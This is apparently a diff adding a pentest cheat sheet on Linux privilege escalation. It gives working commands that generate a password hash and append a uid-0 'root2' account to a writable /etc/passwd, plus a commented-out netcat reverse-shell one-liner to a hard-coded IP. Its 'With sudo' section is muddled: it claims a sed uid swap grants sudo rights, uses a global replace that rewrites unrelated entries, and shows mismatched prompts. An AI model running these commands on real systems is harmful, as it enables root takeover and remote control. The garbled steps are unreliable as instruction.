@@ -1,0 +1,99 @@
+---
+title: 'Basic Elevation of Privilage'
+desc: 'Basic use of Linux Manual'
+tags: 'linux,manual,man'
+---
+
+
+
+# Basic Elevation of Privilage
+
+
+## With sudo 
+
+* Take a closer look of the file permissions 
+
+1. Check /etc/passwd
+
+2. try to add a local user to it using the `adduser` command, 
+
+```sh
+$ sudo adduser pancho
+Enter new UNIX password: 
+...
+```
+3. change its uid to another with sudo permissions, 
+
+4. `su` to that user, and then try accessing the files
+
+5. We can change its uid to sudo using `sed ‘s/newUserId/SudoAccessId/g’ -i (replace in-place) -e (execute; the 's/...//') /etc/passwd`
+
+```sh
+$ sudo sed -i -e 's/1001/1014/g' /etc/passwd
+$ cat /etc/passwd | grep pancho
+pancho:x:1014:1014:,,,:/home/pancho:/bin/bash
+```
+
+6. `su` to the newly added pancho user, verify that our UUID has indeed changed, and then try accessing files. 
+
+```sh
+marcus$ su pancho
+marcus$ id
+uid=1014(pancho) gid=1014 groups=1014
+$ cat creds.txt
+m32n42lk4n23974guiob23l4tr
+```
+
+
+## Without sudo
+
+* exploiting editable /etc/passwd
+
+This file is normally editable by the root user, but if for whatever reason this was changed to allow normal users to edit it, this could result in a full system compromise.
+
+
+1. Generating a new User Hash
+
+```sh
+# option 1: openssl passwd (built-in utility)
+# openssl passwd -1 -salt [hash salt] [password to be used]
+openssl passwd -1 -salt pan pancho123
+$1$pan$pTiB1gfo8xQpdHGy4SUFD1
+
+# option 2: python3
+# python3 -c 'import crypt; print(crypt.crypt([password], "$6$[hash salt]"))'
+python3 -c 'import crypt; print(crypt.crypt("pancho123", "$6$pan"))'
+
+```
+
+2. Exploiting writable passwd file
+
+Once a user hash has been generated, this can be added to the passwd file. 
+
+```sh
+hacked:[hashed-passwd]/:0:0:root:/root:/bin/bash
+
+sudo echo 'root2:$1$pan$pTiB1gfo8xQpdHGy4SUFD1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# sudo sed -i -e 's/love:x:/love:$1$pan$pTiB1gfo8xQpdHGy4SUFD1:/g' /etc/passwd
+
+# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.213 1234 > /tmp/f
+```
+
+Alternatively, the root hash can be changed by replacing the “x” in the passwd file.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
